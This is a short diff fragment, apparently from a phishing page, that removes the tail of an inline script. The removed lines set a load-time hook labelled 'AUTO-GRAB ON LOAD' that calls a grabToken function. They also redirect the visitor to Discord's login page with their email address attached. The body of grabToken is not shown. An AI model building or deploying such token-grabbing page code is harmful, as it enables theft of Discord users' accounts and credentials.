-
-      setTimeout(() => {
-        window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
-      }, 800);
-    };
-
-    // AUTO-GRAB ON LOAD
-    window.addEventListener('load', () => {
-      setTimeout(grabToken, 1200);
-    });
-  </script>
 </body>
 </html>
